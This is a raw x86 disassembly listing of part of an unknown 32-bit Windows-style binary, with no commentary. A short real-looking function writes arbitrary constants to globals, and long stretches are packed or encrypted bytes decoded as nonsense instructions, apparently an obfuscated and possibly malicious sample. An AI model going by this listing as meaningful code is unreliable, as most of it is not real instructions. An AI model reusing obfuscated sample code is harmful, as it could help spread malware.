  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433793,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433767,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433793,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43370f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43379b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43371b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4337d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x6222a95f
  406b85:	dec    edx
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0x3e7e7e7f
  406b8f:	sahf   
  406b90:	adc    eax,0x468863b4
  406b95:	fist   WORD PTR [ebp+0x7]
  406b98:	cmp    al,0xe5
  406b9a:	sub    BYTE PTR [ecx],dh
  406b9c:	ret    
  406b9d:	cmp    BYTE PTR [edi],0xd1
  406ba0:	pop    edx
  406ba1:	mov    edx,0x2778716d
  406ba6:	mov    eax,esi
  406ba8:	or     edx,DWORD PTR [ebp+0x16]
  406bab:	or     dh,BYTE PTR [ebp+0x4f]
  406bae:	jmp    0x520eb252
  406bb3:	stos   DWORD PTR es:[edi],eax
  406bb4:	ins    DWORD PTR es:[edi],dx
  406bb5:	sub    BYTE PTR [ebx],dl
  406bb7:	out    dx,al
  406bb8:	xor    eax,0x6f782dde
  406bbd:	mov    edi,0xa6916342
  406bc2:	cmp    BYTE PTR [esi+edx*8+0x69d83a0a],bh
  406bc9:	mov    ebx,0x3d3ff163
  406bce:	xor    BYTE PTR [eax-0x66c3de1],ch
  406bd4:	mov    ebx,0xd6654742
  406bd9:	xchg   ebx,eax
  406bda:	pushf  
  406bdb:	pop    eax
  406bdc:	js     0x406bc4
  406bde:	add    BYTE PTR [eax-0x323dc531],bl
  406be4:	xchg   ecx,eax
  406be5:	dec    edx
  406be6:	(bad)  
  406be8:	shr    BYTE PTR [eax+0x78914343],0xa8
  406bef:	xchg   edi,eax
  406bf0:	cmp    esp,DWORD PTR [edx]
  406bf2:	xchg   esi,eax
  406bf3:	xchg   edx,eax
  406bf4:	ffreep st(0)
  406bf6:	scas   eax,DWORD PTR es:[edi]
  406bf7:	mov    ecx,DWORD PTR [eax+0x3152122b]
  406bfd:	mov    al,ds:0x7fdad040
  406c02:	ins    BYTE PTR es:[edi],dx
  406c03:	push   ebp
  406c04:	loop   0x406c33
  406c06:	jo     0x406c15
  406c08:	xor    al,0x98
  406c0a:	jb     0x406c53
  406c0c:	cli    
  406c0d:	cmp    dl,0xe3
  406c10:	not    esp
  406c12:	inc    esi
  406c13:	mov    ch,BYTE PTR [ecx+0x2d]
  406c16:	jle    0x406c3b
  406c18:	cli    
  406c19:	mov    dh,0xc9
  406c1b:	sbb    edx,DWORD PTR [esi-0x6465e243]
  406c21:	aam    0xe
  406c23:	push   es
  406c24:	push   es
  406c25:	lock mov bh,0x83
  406c28:	inc    esi
  406c29:	push   esp
  406c2a:	inc    ebp
  406c2b:	test   ebp,eax
  406c2d:	rcl    dh,1
  406c2f:	sub    eax,0xb54b91c7
  406c34:	jmp    0x406c0d
  406c36:	xchg   DWORD PTR [esi-0x2b],ecx
  406c39:	cld    
  406c3a:	pop    esi
  406c3b:	or     BYTE PTR [edx-0x4c96c9c7],ch
  406c41:	cld    
  406c42:	jne    0x406c3b
  406c44:	mov    eax,ds:0xb1c1db7b
  406c49:	mov    ecx,0x5588682c
  406c4e:	lea    ecx,[edi-0x34]
  406c51:	pop    ecx
  406c52:	nop
  406c53:	xor    DWORD PTR [ecx+0x53],esi
  406c56:	sub    bh,BYTE PTR [edi]
  406c58:	mov    ebp,0xacc667b7
  406c5d:	mov    eax,0x200e2325
  406c62:	icebp  
  406c63:	ins    DWORD PTR es:[edi],dx
  406c64:	xchg   esi,eax
  406c65:	arpl   WORD PTR gs:[ebx],sp
  406c68:	aam    0x76
  406c6a:	mov    ebx,0x81f5cf79
  406c6f:	ret    
  406c70:	add    DWORD PTR [edi-0x5e8ea284],edi
  406c76:	pop    ds
  406c77:	pop    ebp
  406c78:	add    bl,BYTE PTR [edi]
  406c7a:	inc    ebx
  406c7b:	in     eax,0xf8
  406c7d:	jne    0x406cb5
  406c7f:	jmp    0x195ce8cf
  406c84:	push   esp
  406c85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c86:	cmp    BYTE PTR [ebp-0x46],cl
  406c89:	les    edx,FWORD PTR [ecx-0x712eb3f7]
  406c8f:	(bad)  
  406c90:	adc    cl,BYTE PTR [esi-0xb]
  406c93:	sar    DWORD PTR [ebx-0x338b49c4],1
  406c99:	inc    edx
  406c9a:	mov    esp,0x80c0f533
  406c9f:	pop    ds
  406ca0:	nop
  406ca1:	add    BYTE PTR [edi+0x70],0x7f
  406ca5:	sub    DWORD PTR [edx-0x266e489b],0xcf8a73c4
  406caf:	jns    0x406c57
  406cb1:	mov    eax,ds:0xbcd0d464
  406cb6:	cmp    BYTE PTR [edi-0x6ad5ab46],al
  406cbc:	jne    0x406c9c
  406cbe:	cli    
  406cbf:	mov    ds:0x909af1b2,al
  406cc4:	hlt    
  406cc5:	cwde   
  406cc6:	adc    al,0x81
  406cc8:	mov    WORD PTR [edx+0x1ec80f29],gs
  406cce:	fisubr DWORD PTR [ebp+0x429dde9b]
  406cd4:	data16 icebp 
  406cd6:	add    al,0xa5
  406cd8:	jg     0x406d0f
  406cda:	mov    ebp,0x8aa5643c
  406cdf:	cld    
  406ce0:	sbb    eax,0xccecd8e1
  406ce5:	imul   BYTE PTR [ecx+edi*2-0x1fb73563]
  406cec:	jmp    0x406d48
  406cee:	mov    ecx,0x64dda4b7
  406cf3:	sub    al,BYTE PTR [ebp-0xb774d4]
  406cf9:	xor    eax,0x7ca70505
  406cfe:	stos   DWORD PTR es:[edi],eax
  406cff:	das    
  406d00:	je     0x406d24
  406d02:	jo     0x406cbd
  406d04:	imul   esp,esp,0x4f
  406d07:	adc    eax,0x47e29dbc
  406d0c:	sub    BYTE PTR [ecx-0x56e8eeee],0xc1
  406d13:	and    dh,BYTE PTR [edx-0x52ab9fbc]
  406d19:	mov    DWORD PTR [edi],ebp
  406d1b:	inc    esi
  406d1c:	imul   eax
  406d1e:	stos   BYTE PTR es:[edi],al
  406d1f:	(bad)  
  406d20:	test   eax,0xdbdce493
  406d25:	fld    TBYTE PTR [edx]
  406d27:	jbe    0x406d3d
  406d29:	add    al,0x2
  406d2b:	pop    ds
  406d2c:	xchg   esi,eax
  406d2d:	lods   al,BYTE PTR ds:[esi]
  406d2e:	mov    edi,esp
  406d30:	and    esi,DWORD PTR [ecx+0x1a]
  406d33:	mov    ecx,0x279be836
  406d38:	mov    edx,0x7ecfeef5
  406d3d:	rcr    BYTE PTR [ebx],0xee
  406d40:	mov    eax,0xbf1acc0c
  406d45:	jae    0x406dba
  406d47:	(bad)  
  406d49:	lock test DWORD PTR [edi],ebp
  406d4c:	pop    es
  406d4d:	out    0xd9,eax
  406d4f:	or     ah,BYTE PTR [esi+0x33]
  406d52:	sar    DWORD PTR [ecx+0x3b02],0x81
  406d59:	sbb    eax,0x43382f
  406d5e:	adc    esi,DWORD PTR [edi]
  406d60:	inc    ebx
  406d61:	add    BYTE PTR [esi+0x3],ah
  406d64:	rol    DWORD PTR [ecx+0x43382305],0x0
  406d6b:	push   edi
  406d6c:	jge    0x406d6e
  406d6e:	add    BYTE PTR [ebx-0x48f0f7b3],cl
  406d74:	rol    BYTE PTR [ecx+0x4337631d],0x0
  406d7b:	getsec 
  406d7d:	inc    ebx
  406d7e:	add    cl,ch
  406d80:	fiadd  DWORD PTR [ecx]
  406d82:	add    BYTE PTR [eax],al
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x43
  406d91:	popa   
  406d92:	out    0x5b,al
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0xe57e7e7f
  406d9d:	sbb    dl,ah
  406d9f:	sub    BYTE PTR [edi-0x217cbbbf],ch
  406da5:	mov    dl,0x72
  406da7:	jle    0x406da7
  406da9:	int3   
  406daa:	xor    DWORD PTR [edi+0x2f57e5fa],esi
  406db0:	shl    DWORD PTR [eax],cl
  406db2:	push   ecx
  406db3:	pusha  
  406db4:	mov    bh,0xc2
  406db6:	inc    ecx
  406db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406db8:	(bad)  
  406db9:	xor    BYTE PTR [esi-0xad1766f],al
  406dbf:	(bad)  
  406dc0:	push   ebp
  406dc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dc2:	mov    DWORD PTR [esi],ebx
  406dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dc5:	adc    ebx,DWORD PTR [ebp+eiz*1-0x20ba06b9]
  406dcc:	hlt    
  406dcd:	adc    esi,DWORD PTR [esi+eax*8+0x77]
  406dd1:	push   ecx
  406dd2:	sbb    esp,DWORD PTR [eax]
  406dd4:	int3   
  406dd5:	test   DWORD PTR [edx+0x0],ebp
  406dd8:	mov    esp,0xc76840ab
  406ddd:	or     esp,DWORD PTR [ebp+0x31]
  406de0:	repnz nop
  406de2:	outs   dx,BYTE PTR ds:[esi]
  406de3:	into   
  406de4:	(bad)  
  406de5:	cs and al,dh
  406de8:	sar    BYTE PTR [ebx],cl
  406dea:	retf   0x91f8
  406ded:	out    0x2a,eax
  406def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406df0:	pop    edi
  406df1:	dec    edi
  406df2:	shl    ah,1
  406df4:	jmp    0x3c0a:0xf065d0ca
  406dfb:	shl    DWORD PTR ds:0x31635cb1,1
  406e01:	popf   
  406e02:	add    DWORD PTR [edi],ebp
  406e04:	hlt    
  406e05:	sbb    BYTE PTR [edi],ch
  406e07:	mov    cs,WORD PTR [edi]
  406e09:	mov    ah,0xb4
  406e0b:	int    0x86
  406e0d:	sub    eax,0xdbc063b4
  406e12:	clc    
  406e13:	scas   eax,DWORD PTR es:[edi]
  406e14:	xchg   esi,eax
  406e15:	sbb    al,0x5f
  406e17:	cmp    ebp,DWORD PTR [ecx-0x7c]
  406e1a:	sub    eax,0xfb254b51
  406e1f:	imul   eax,esp,0xffffffd5
  406e22:	adc    eax,0x7d7d91f4
  406e27:	xchg   esi,eax
  406e28:	add    eax,0x2d22a48c
  406e2d:	cmc    
  406e2e:	test   DWORD PTR [ebx+0x25],edx
  406e31:	and    al,BYTE PTR [edx-0x5f]
  406e34:	or     BYTE PTR [ebp+0x62],ah
  406e37:	add    BYTE PTR [edi],cl
  406e39:	call   FWORD PTR [ecx-0xfaa059b]
  406e3f:	ins    BYTE PTR es:[edi],dx
  406e40:	dec    edx
  406e41:	rcr    DWORD PTR [edx],1
  406e43:	push   ebx
  406e44:	xor    edx,ebx
  406e46:	mov    ecx,0x6fec6e3
  406e4b:	mov    ebp,0xa2a1746e
  406e50:	arpl   WORD PTR [eax+ecx*4],cx
  406e53:	enter  0x4615,0x62
  406e57:	(bad)  
  406e58:	pop    ss
  406e59:	(bad)  
  406e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e5b:	inc    edi
  406e5c:	cmp    DWORD PTR [edi+0x5e],eax
  406e5f:	rol    DWORD PTR [esi],0xe5
  406e62:	call   edi
  406e64:	daa    
  406e65:	ss cld 
  406e67:	js     0x406dec
  406e69:	scas   al,BYTE PTR es:[edi]
  406e6a:	push   ds
  406e6b:	cmp    ecx,esi
  406e6d:	push   ebx
  406e6e:	mov    WORD PTR [edi-0x42],?
  406e71:	js     0x406e60
  406e73:	outs   dx,DWORD PTR ds:[esi]
  406e74:	cmp    al,0x90
  406e76:	cld    
  406e77:	sahf   
  406e78:	fwait
  406e79:	neg    DWORD PTR [edx]
  406e7b:	mov    esi,0x79e41993
  406e80:	in     al,0x51
  406e82:	push   esi
  406e83:	iret   
  406e84:	sbb    eax,0xa794598b
  406e89:	dec    eax
  406e8a:	out    dx,eax
  406e8b:	adc    dl,ch
  406e8d:	stc    
  406e8e:	cmp    al,0x1a
  406e90:	fidiv  DWORD PTR [ebx-0x76]
  406e93:	xchg   ebx,eax
  406e94:	pusha  
  406e95:	lock push esp
  406e97:	aaa    
  406e98:	in     al,dx
  406e99:	arpl   ax,ax
  406e9b:	xchg   DWORD PTR [ebp-0x111504f6],ecx
  406ea1:	push   esp
  406ea2:	pushf  
  406ea3:	lock cmp DWORD PTR [esi],edx
  406ea6:	aas    
  406ea7:	pop    eax
  406ea8:	mov    ebp,0x424a8649
  406ead:	xchg   ebp,eax
  406eae:	aas    
  406eaf:	ret    
  406eb0:	cld    
  406eb1:	mov    esp,0x8b0fc129
  406eb6:	adc    eax,0x2e8b1d9d
  406ebb:	ret    
  406ebc:	jno    0x406ea8
  406ebe:	test   eax,0x1605ffdc
  406ec3:	pop    ds
  406ec4:	test   al,0x91
  406ec6:	mov    al,ds:0x7ebac45c
  406ecb:	push   ebx
  406ecc:	xchg   BYTE PTR [esi],al
  406ece:	jle    0x406e5a
  406ed0:	jns    0x406ed8
  406ed2:	jnp    0x406efa
  406ed4:	ret    
  406ed5:	jge    0x406f08
  406ed7:	cmp    esi,0x6e6ae364
  406edd:	cmp    bh,BYTE PTR [eax+0x26]
  406ee0:	jmp    0xe08c8e81
  406ee5:	mov    ds:0x71a762ff,eax
  406eea:	loop   0x406f27
  406eec:	push   esi
  406eed:	add    al,0x73
  406eef:	ins    BYTE PTR es:[edi],dx
  406ef0:	jne    0x406eee
  406ef2:	pop    edx
  406ef3:	or     BYTE PTR [edx-0x3ab3d7c],dl
  406ef9:	out    0x25,eax
  406efb:	std    
  406efc:	bound  esp,QWORD PTR [esi]
  406efe:	retf   
  406eff:	dec    ebp
  406f00:	inc    eax
  406f01:	dec    eax
  406f02:	mov    al,ds:0x99c5ede3
  406f07:	arpl   WORD PTR [ebx-0x3],dx
  406f0a:	xor    al,0xc7
  406f0c:	mov    esi,0x8b022cff
  406f11:	jg     0x406ef1
  406f13:	rcl    BYTE PTR [ecx-0x30],1
  406f16:	pop    esi
  406f17:	sbb    eax,0x66d32f42
  406f1d:	sbb    ebx,DWORD PTR [eax-0x2b]
  406f20:	mov    ecx,0xc2ba1e79
  406f25:	jge    0x406ef7
  406f27:	mov    eax,0x53c40b4c
  406f2c:	shl    ebx,cl
  406f2e:	test   DWORD PTR ds:0x1aefd9a3,0xee2ca5ff
  406f38:	mov    dl,0x9a
  406f3a:	rcl    edx,cl
  406f3c:	mov    ?,WORD PTR [edx]
  406f3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f3f:	in     al,0x21
  406f41:	in     eax,0xbe
  406f43:	cmp    eax,0x5b68695d
  406f48:	outs   dx,DWORD PTR ds:[esi]
  406f49:	dec    esi
  406f4a:	xchg   ebx,eax
  406f4b:	ret    0x6433
  406f4e:	add    cl,BYTE PTR [edi-0x79b3a38b]
  406f54:	mov    ?,WORD PTR [esi]
  406f56:	adc    bh,BYTE PTR [edi]
  406f58:	fldenv [ebx-0x44]
  406f5b:	add    BYTE PTR [edi-0x7a],dl
  406f5e:	not    eax
  406f60:	and    DWORD PTR ds:0x43370f,0x433753
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xbfef4312
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x3e7e7e7f
  406f9f:	fcomp  QWORD PTR [edi]
  406fa1:	out    0xd0,eax
  406fa3:	ret    
  406fa4:	outs   dx,BYTE PTR ds:[esi]
  406fa5:	mov    ecx,edx
  406fa7:	jne    0x406f95
  406fa9:	mov    edi,0x8b3e87e1
  406fae:	adc    ebx,edx
  406fb0:	dec    edx
  406fb1:	xor    DWORD PTR [ebp-0x7d2316f9],ebx
  406fb7:	les    ecx,FWORD PTR [edx-0x5bec3d38]
  406fbd:	out    dx,eax
  406fbe:	and    BYTE PTR [ecx-0x7c],0x7f
  406fc2:	push   0x49
  406fc4:	xchg   edi,eax
  406fc5:	es stc 
  406fc7:	int    0xcc
  406fc9:	sub    DWORD PTR [edi],ebx
  406fcb:	push   ecx
  406fcc:	ins    DWORD PTR es:[edi],dx
  406fcd:	int    0xfb
  406fcf:	(bad)  
  406fd0:	cmc    
  406fd1:	mov    ss,WORD PTR [esi]
  406fd3:	mov    ah,0xa8
  406fd5:	out    dx,eax
  406fd6:	xor    dl,BYTE PTR [ebx+0x730afde1]
  406fdc:	(bad)  
  406fdd:	ds cmp ah,bh
  406fe0:	xchg   edi,eax
  406fe1:	push   ecx
  406fe2:	mov    WORD PTR [eax+0x51],cs
  406fe5:	and    BYTE PTR [edi],0x2a
  406fe8:	sub    ch,cl
  406fea:	xor    di,WORD PTR [ecx+0x7a]
  406fee:	fisubr WORD PTR [ecx]
  406ff0:	mov    ebx,0x785ff994
  406ff5:	xchg   DWORD PTR [esi],edx
  406ff7:	add    BYTE PTR [eax+0x45],0x8e
  406ffb:	jnp    0x406fad
  406ffd:	es aad 0x99
  407000:	mov    esp,DWORD PTR [esi-0x65c3a443]
  407006:	or     al,0xeb
  407008:	and    BYTE PTR [esi+0x3305ddf1],bl
  40700e:	pop    ds
  40700f:	call   0x2032:0x23f0b9bc
  407016:	out    dx,eax
  407017:	lahf   
  407018:	aad    0x49
  40701a:	in     eax,dx
  40701b:	popa   
  40701c:	test   al,0x82
  40701e:	rcr    DWORD PTR [eax-0x74],cl
  407021:	xchg   ebp,ebx
  407023:	sbb    ecx,ebp
  407025:	retf   
  407026:	add    DWORD PTR [eax+0x38],ebx
  407029:	dec    esp
  40702a:	mov    cl,0xfa
  40702c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40702d:	fisubr DWORD PTR [edi]
  40702f:	mov    DWORD PTR [ecx+eax*8-0x68],0x4e3b017e
  407037:	ror    BYTE PTR [edx-0x4312af7b],0xd9
  40703e:	adc    DWORD PTR [edx-0x42],esi
  407041:	std    
  407042:	scas   eax,DWORD PTR es:[edi]
  407043:	fmul   QWORD PTR ss:[ebx+0x65d4384b]
  40704a:	and    DWORD PTR gs:[esp+edi*4],esi
  40704e:	xchg   ebx,esi
  407050:	mov    cl,0xdd
  407052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407053:	sahf   
  407054:	inc    edi
  407055:	jge    0x407026
  407057:	in     al,dx
  407058:	cmp    bh,0x63
  40705b:	icebp  
  40705c:	cmc    
  40705d:	mov    ah,0x5
  40705f:	mov    bl,BYTE PTR [ecx]
  407061:	or     al,0xd6
  407063:	and    eax,DWORD PTR [eax-0x4d1a9ffc]
  407069:	and    DWORD PTR [esi+0x6a],ebp
  40706c:	or     ch,BYTE PTR [ecx-0x1a2747dc]
  407072:	leave  
  407073:	icebp  
  407074:	iret   
  407075:	ret    0x277e
  407078:	pop    eax
  407079:	cmp    ch,BYTE PTR [esi+0x37]
  40707c:	mov    al,0x38
  40707e:	popa   
  40707f:	or     BYTE PTR [eax+0x8],ch
  407082:	mov    al,ds:0x650e3c9f
  407087:	psrlq  mm6,QWORD PTR [ebx-0x1a9b0623]
  40708e:	mov    al,0x48
  407090:	sar    DWORD PTR [esp+ebp*2],1
  407093:	rcr    DWORD PTR [edi],1
  407095:	sub    BYTE PTR [edi+0xbe1d84f],0xb9
  40709c:	loope  0x40704a
  40709e:	shl    ecx,0x79
  4070a1:	test   al,0x2c
  4070a3:	aam    0x8b
  4070a5:	mul    DWORD PTR [ebx-0x2a611971]
  4070ab:	pop    ecx
  4070ac:	dec    ecx
  4070ad:	inc    edi
  4070ae:	sub    ecx,esi
  4070b0:	mov    ds:0xbba00e62,eax
  4070b5:	push   0x78
  4070b7:	in     eax,dx
  4070b8:	icebp  
  4070b9:	mov    bl,0xb5
  4070bb:	outs   dx,BYTE PTR ss:[esi]
  4070bd:	mov    esp,0xd5c53e86
  4070c2:	in     al,0x76
  4070c4:	xchg   esp,eax
  4070c5:	ss daa 
  4070c7:	cmp    eax,0xd56cfde9
  4070cc:	dec    esi
  4070cd:	stos   BYTE PTR es:[edi],al
  4070ce:	adc    BYTE PTR [edx-0x58c4d973],bh
  4070d4:	mov    ebx,0x2f52604f
  4070d9:	call   0xcbf3:0x65062e4c
  4070e0:	jnp    0x4070af
  4070e2:	(bad)  
  4070e3:	(bad)  
  4070e4:	out    0xa5,eax
  4070e6:	sub    bh,BYTE PTR [ecx+0x145a6ca]
  4070ec:	or     eax,0xacf4af63
  4070f1:	mov    edx,0xd5f2a07b
  4070f6:	and    DWORD PTR [edi-0x23c4d42d],esi
  4070fc:	es jmp 0x40708b
  4070ff:	je     0x40717b
  407101:	sub    BYTE PTR [edx+0x6],dh
  407104:	into   
  407105:	stos   BYTE PTR es:[edi],al
  407106:	scas   al,BYTE PTR es:[edi]
  407107:	dec    esi
  407108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407109:	or     dh,ch
  40710b:	jb     0x4070b5
  40710d:	xchg   ebx,eax
  40710e:	mov    ah,0x23
  407110:	jg     0x4070d2
  407112:	adc    BYTE PTR [ebx],al
  407114:	retf   0x1c8c
  407117:	daa    
  407118:	xchg   esp,eax
  407119:	jl     0x4070d2
  40711b:	std    
  40711c:	pcmpgtd mm2,QWORD PTR [eax]
  40711f:	fmul   DWORD PTR [ecx-0x4fd7e098]
  407125:	jg     0x4070f7
  407127:	add    al,0x9c
  407129:	xor    al,0xa3
  40712b:	(bad)  
  40712c:	pushf  
  40712d:	jl     0x4070b1
  40712f:	push   cs
  407130:	jg     0x407111
  407132:	sar    ecx,0x2b
  407135:	mov    WORD PTR [eax],fs
  407137:	outs   dx,BYTE PTR ds:[esi]
  407138:	out    0x5f,eax
  40713a:	lds    edi,FWORD PTR [esi]
  40713c:	push   edi
  40713d:	mov    bl,0x52
  40713f:	jno    0x40714b
  407141:	in     al,dx
  407142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407143:	push   edi
  407144:	out    dx,al
  407145:	imul   eax,DWORD PTR [ebp+0x6],0x5
  407149:	(bad)  
  40714b:	push   ds
  40714c:	push   ss
  40714d:	cmp    ecx,DWORD PTR [eax]
  40714f:	(bad)  
  407150:	cld    
  407151:	xchg   ebp,eax
  407152:	or     BYTE PTR [edi+0x3b],0xaa
  407156:	stos   BYTE PTR es:[edi],al
  407157:	loope  0x40711f
  407159:	dec    ebp
  40715a:	loopne 0x407132
  40715c:	inc    ecx
  40715d:	stos   DWORD PTR es:[edi],eax
  40715e:	pop    ecx
  40715f:	arpl   di,di
  407161:	jne    0x40716b
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	sti    
  40717c:	jne    0x407154
  40717e:	push   edx
  40717f:	int3   
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0xb27e7e7f
  407188:	pop    ss
  407189:	xor    al,0x2b
  40718b:	and    al,0x28
  40718d:	dec    esi
  40718e:	sub    DWORD PTR [edx],eax
  407190:	jge    0x407148
  407192:	or     BYTE PTR [edi+0x6b],dh
  407195:	mov    dh,0x6f
  407198:	popf   
  407199:	sbb    ebx,esi
  40719b:	sub    BYTE PTR [eax+0x731fa555],al
  4071a1:	mov    al,ds:0x641bcf3e
  4071a6:	adc    eax,0x1073114
  4071ac:	fsubr  DWORD PTR [ecx+0x464fa41c]
  4071b2:	and    BYTE PTR ds:0xb12ae1bf,ch
  4071b8:	fwait
  4071b9:	cli    
  4071ba:	rcl    DWORD PTR [esi+0xb213754],cl
  4071c0:	leave  
  4071c1:	or     ebx,DWORD PTR [eax]
  4071c3:	jmp    0xd439aedd
  4071c8:	fsubrp st(0),st
  4071ca:	mov    DWORD PTR [ebx],esp
  4071cc:	add    bh,BYTE PTR [edx+0x7e]
  4071cf:	pop    esp
  4071d0:	mov    BYTE PTR [edx],bl
  4071d2:	inc    edi
  4071d3:	push   esi
  4071d4:	rol    DWORD PTR [ebx-0x27f40d4a],cl
  4071da:	aas    
  4071db:	sub    eax,0x977f3295
  4071e0:	ror    BYTE PTR [eax+ebp*4+0x38361adf],cl
  4071e7:	bound  esp,QWORD PTR [edi-0x4d]
  4071ea:	jae    0x4071a2
  4071ec:	mov    ecx,0xc0fd1727
  4071f1:	pop    esp
  4071f2:	jbe    0x407245
  4071f4:	pop    es
  4071f5:	lock maxps xmm3,XMMWORD PTR [edi*8+0x1c2a04b3]
  4071fe:	enter  0xa886,0xb2
  407202:	out    0x65,eax
  407204:	sar    DWORD PTR [edi],cl
  407206:	dec    ebp
  407207:	aas    
  407208:	adc    cl,BYTE PTR [ebp+0x1abac09c]
  40720e:	jl     0x40728e
  407210:	xchg   esi,eax
  407211:	pop    esi
  407212:	sbb    eax,0x92035ff2
  407217:	push   edx
  407218:	inc    ebp
  407219:	idiv   bl
  40721b:	jl     0x407232
  40721d:	adc    DWORD PTR [esi+ebx*2],esi
  407220:	pop    ecx
  407221:	mov    edi,DWORD PTR [edi-0x4f]
  407224:	into   
  407225:	adc    DWORD PTR [esi-0x5dd83759],0xffffffc3
  40722c:	push   ecx
  40722d:	xchg   ebx,eax
  40722e:	out    0x48,al
  407230:	outs   dx,DWORD PTR ds:[esi]
  407231:	mov    al,0xc3
  407233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407234:	and    eax,0x7d8c1fe0
  407239:	lods   eax,DWORD PTR ds:[esi]
  40723a:	push   esp
  40723b:	leavew 
  40723d:	mov    ecx,0x29734d7d
  407242:	shl    BYTE PTR [eax],0xba
  407245:	js     0x4072c4
  407247:	lods   eax,DWORD PTR ds:[esi]
  407248:	mov    esp,0xf7d6f21a
  40724d:	sub    cl,BYTE PTR [ebx]
  40724f:	(bad)  
  407250:	mov    ebx,0xd9a979f
  407255:	in     eax,dx
  407256:	je     0x4072b1
  407258:	ret    
  407259:	or     cl,dh
  40725b:	ins    BYTE PTR es:[edi],dx
  40725c:	outs   dx,DWORD PTR ds:[esi]
  40725d:	inc    ebp
  40725e:	(bad)  
  40725f:	cld    
  407260:	xchg   edi,eax
  407261:	pop    eax
  407262:	xor    BYTE PTR [esi],bh
  407264:	(bad)  
  407265:	mov    eax,ds:0x176a22be
  40726a:	ret    0x26d6
  40726d:	jl     0x407234
  40726f:	rcl    eax,1
  407271:	clc    
  407272:	and    ebx,DWORD PTR [ebx]
  407274:	shr    DWORD PTR [eax],1
  407276:	dec    ebp
  407277:	mov    ecx,0x76283ce2
  40727c:	mov    WORD PTR [ebp+0x21],es
  40727f:	xor    eax,DWORD PTR [edx+0x1105136f]
  407285:	outs   dx,BYTE PTR ds:[esi]
  407286:	(bad)  
  407287:	xor    al,0x42
  407289:	sub    BYTE PTR [eax+0x22239263],cl
  40728f:	add    DWORD PTR [eax],ebx
  407291:	shl    ebx,1
  407293:	(bad)  
  407294:	(bad)  
  407295:	xchg   edx,eax
  407296:	mov    edx,0x5c86d59e
  40729b:	xchg   ebp,eax
  40729c:	push   ebx
  40729d:	push   esi
  40729e:	jo     0x4072d3
  4072a0:	push   ebx
  4072a1:	fldenv [ebp+0x2e024b29]
  4072a7:	dec    edx
  4072a8:	xchg   ebx,eax
  4072a9:	fnstenv [ebx]
  4072ab:	jns    0x407241
  4072ad:	ret    
  4072ae:	dec    edx
  4072af:	jns    0x40729e
  4072b1:	int    0x35
  4072b3:	icebp  
  4072b4:	sbb    ebp,DWORD PTR [ebp-0x2529acef]
  4072ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072bb:	cmp    al,0xe3
  4072bd:	adc    al,0xcf
  4072bf:	rol    BYTE PTR [edx+eax*4+0x3cfe68a6],cl
  4072c6:	xor    BYTE PTR cs:[esi+edx*4],dl
  4072ca:	push   ss
  4072cb:	gs sti 
  4072cd:	xchg   BYTE PTR [edx+eiz*2+0x39],al
  4072d1:	ror    DWORD PTR [ecx+0x40dd534e],0x6f
  4072d8:	(bad)  
